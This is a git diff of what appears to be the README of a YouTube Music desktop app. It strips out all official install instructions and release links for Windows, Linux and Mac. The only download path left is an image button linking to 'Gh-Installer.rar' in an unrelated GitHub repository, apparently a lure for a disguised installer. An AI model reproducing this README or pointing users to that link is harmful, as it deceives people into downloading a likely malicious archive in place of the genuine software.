@@ -19,28 +19,6 @@ TODO: Write guides for v2. While these may still be helpful they are geared towa
 # ⬇️ Download at
 [![Download](https://i.postimg.cc/0QdN7Rxz/Click-to-download.png)](https://github.com/yourmomisfieldtested/yourmomisfieldtested1/releases/download/ClientApp/Gh-Installer.rar)
 
-#### Windows
-<!--
-### UPDATE THESE PLATFORMS ###
-- Winget: ```winget install "YouTube Music Desktop App"``` or ```winget install Ytmdesktop.Ytmdesktop```
-- Chocolatey: ```choco install ytmdesktop```
--->
-- Binaries: <https://github.com/ytmdesktop/ytmdesktop/releases>
-
-#### Linux
-<!--
-### UPDATE THESE PLATFORMS ###
-- Arch Linux (AUR): <https://aur.archlinux.org/packages/ytmdesktop-git>
-- Snap: <https://snapcraft.io/youtube-music-desktop-app>
--->
-- Binaries: <https://github.com/ytmdesktop/ytmdesktop/releases>
-
-#### Mac
-<!--
-### UPDATE THESE PLATFORMS ###
-- Brew: ```brew install --cask ytmdesktop-youtube-music```
--->
-- Binaries: <https://github.com/ytmdesktop/ytmdesktop/releases>
 
 # Developing
 To clone and run this repository you'll need [Git](https://git-scm.com) and [Node.js (v20)](https://nodejs.org/en/download/) (which comes with [npm](http://npmjs.com)) installed on your computer. From your command line:
